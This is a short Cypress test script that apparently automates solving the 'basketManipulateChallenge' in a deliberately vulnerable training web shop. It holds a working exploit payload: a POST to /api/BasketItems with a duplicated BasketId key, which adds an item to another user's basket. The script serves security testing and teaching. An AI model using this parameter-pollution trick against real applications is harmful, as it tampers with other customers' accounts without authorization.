export function basketManipulateChallenge() {
    
  cy.signin('cypress@mail.com','cypress');
      
  cy.get('@token').then((token) => {
        
    // Axios allows to send JSON paylaod with duplicated key
    const axios = require('axios');
      
    const axiosOptions = {
      method: 'POST',
      url: '/api/BasketItems',
      data: `{"ProductId":12,"BasketId":"${sessionStorage.getItem('bid')}","quantity": 1,"BasketId":"2"}`,
      headers: { 
        Authorization: `Bearer ${token}`,
        'Content-Type': 'application/json'
      }
    };
        
    cy.window().then((win) => {
      axios(axiosOptions)
    });
        
    // waiting ContinuousCode (faire un spy ?)
    cy.wait(2000);
        
    cy.isSolvedChallenge('basketManipulateChallenge').should('eq', true);
        
  });
  
}
